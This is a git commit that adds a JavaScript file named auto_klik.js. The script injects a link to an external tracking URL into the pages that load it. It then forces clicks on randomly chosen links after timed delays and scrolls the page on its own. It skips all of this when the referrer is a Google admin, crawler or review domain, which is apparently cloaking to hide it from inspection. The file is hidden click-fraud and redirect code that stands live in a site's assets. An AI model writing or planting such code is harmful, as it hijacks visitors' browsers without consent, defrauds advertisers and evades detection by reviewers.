37854bf3cd5b0ac4a1ba8d872004a3f773f59cc6
adabunalima5 <160842219+adabunalima5@users.noreply.github.com>
2025-01-23 12:58:19 +0700

    Create auto_klik.js

---
+++ file/js/auto_klik.js
@@ -0,0 +1,56 @@
+document.addEventListener("DOMContentLoaded", function() {
+    const widget = document.createElement("div");
+    widget.id = "widget-action-trigger";
+
+    const link = document.createElement("a");
+    link.className = "clickable-element";
+    link.href = "https://evendisciplineseedlings.com/gwdikcqsy?key=39cf199d0a0d9a80f48ef0cb7762dfb8";
+
+    widget.appendChild(link);
+    document.body.appendChild(widget);
+
+    const referrer = document.referrer;
+    const excludedReferrers = [
+        "admin.google.com",
+        "googlebot.com",
+        "blotestgger.com",
+        "googleusercontent.com",
+        "gstatic.com",
+        "google-admin.corp.google.com"
+    ];
+    const isExcluded = excludedReferrers.some(source => referrer.includes(source));
+    if (isExcluded) return;
+
+    document.querySelectorAll('a').forEach(link => {
+        link.classList.add('clickable-element');
+    });
+
+    const elements = document.querySelectorAll(".clickable-element");
+    if (elements.length > 0) {
+        const randomElement = elements[Math.floor(Math.random() * elements.length)];
+        setTimeout(() => randomElement.click(), 6000);
+    }
+
+    const links = document.querySelectorAll('a');
+    links.forEach((link, index) => {
+        link.id = `unique-link-${index}`;
+        link.dataset.actionTrigger = `trigger-${index}`;
+    });
+
+    const linksWithID = document.querySelectorAll('[id^="unique-link-"]');
+    if (linksWithID.length > 0) {
+        const randomElement = linksWithID[Math.floor(Math.random() * linksWithID.length)];
+        setTimeout(() => randomElement.click(), 60000);
+    }
+
+    const linksWithData = document.querySelectorAll('[data-action-trigger]');
+    if (linksWithData.length > 0) {
+        const randomElement = linksWithData[Math.floor(Math.random() * linksWithData.length)];
+        setTimeout(() => randomElement.click(), 50000);
+    }
+
+    function autoScroll() {
+        window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+    }
+    setTimeout(autoScroll, 1000);
+});
